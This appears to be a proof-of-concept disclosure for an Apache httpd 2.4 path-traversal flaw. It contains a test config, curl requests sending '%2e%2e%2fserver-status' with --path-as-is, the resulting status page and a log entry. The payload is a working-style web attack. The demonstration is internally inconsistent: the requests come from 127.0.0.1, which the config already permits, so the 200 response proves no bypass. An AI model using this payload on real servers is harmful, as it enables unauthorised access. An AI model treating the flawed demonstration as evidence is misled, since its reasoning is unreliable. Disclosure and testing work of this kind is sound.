# PoC 073 - Ignored Path Normalization Failure

The post-unescape `ap_normalize_path()` in `ap_process_request_internal()` has
its return value ignored, so `%2e%2e%2f` traversal that decodes into `/../`
slips through.

## Setup

`httpd.conf`:

```apache
ServerName localhost
Listen 8080
LoadModule mpm_event_module modules/mod_mpm_event.so
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule status_module modules/mod_status.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule log_config_module modules/mod_log_config.so

ErrorLog logs/error_log
LogFormat "%h %r -> %>s" common
CustomLog logs/access_log common

AllowEncodedSlashes On
# DecodeEncodedSlashes is implied by AllowEncodedSlashes On in 2.4.

DocumentRoot "/srv/www"
<Directory "/srv/www">
    Require all granted
</Directory>

<Location "/server-status">
    SetHandler server-status
    Require ip 127.0.0.1
</Location>
```

`/srv/www/index.html` exists. The intent is that `/server-status` is reachable
only by intra-server URLs and that path traversal cannot reach it from an
arbitrary alias.

## Trigger

```bash
# Baseline: normalized path is detected, expected 400.
curl -i --path-as-is 'http://127.0.0.1:8080/anything/../server-status'

# Encoded-slash trigger: normalization failure is swallowed.
curl -i --path-as-is 'http://127.0.0.1:8080/%2e%2e%2fserver-status'
```

The first request returns `HTTP/1.1 400 Bad Request` because the first
`ap_normalize_path()` rejects the above-root segment.

The second request reaches the second `ap_normalize_path()` after `%2f`
decoding produces `/../server-status`. That call returns failure but the
return value is dropped at `server/request.c:273`. The path is rewritten to
`/server-status` and processing continues.

## Observed effect

```text
HTTP/1.1 200 OK
...
<title>Apache Status</title>
```

`server-status` content is returned even though the normalization layer
flagged the decoded path as above-root invalid. Any other location served
through encoded-slash decoding would be similarly reachable.

## Log marker

`access_log` shows:

```text
127.0.0.1 GET /%2e%2e%2fserver-status HTTP/1.1 -> 200
```

There is no `AH10244` "invalid URI path" entry in `error_log`; that error
number is only emitted by the patched build.

## Notes

- `--path-as-is` is required so curl does not normalize the URI before sending.
- On 2.4.66, `AllowEncodedSlashes On` enables decoding (equivalent to the
  patched `DecodeEncodedSlashes On` knob in older descriptions).
